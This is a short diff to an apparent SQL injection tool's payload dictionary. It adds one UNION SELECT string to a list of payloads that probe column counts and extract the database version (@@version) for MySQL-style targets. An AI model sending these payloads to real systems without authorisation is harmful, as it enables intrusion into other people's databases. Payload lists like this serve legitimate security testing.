@@ -9,7 +9,8 @@ injections = {
         "1 UNION SELECT NULL,NULL,NULL,@@version; -- ",
         "1 UNION SELECT NULL,NULL,NULL,NULL,@@version; -- ",
         "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,@@version; -- ",
-        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,@@version; -- "
+        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,@@version; -- ",
+        "1 UNION SELECT NULL,NULL,NULL,1",
     ],
     "mysql_str": ["1' UNION SELECT @@version; -- ",
         "1' UNION SELECT NULL,@@version; -- ",
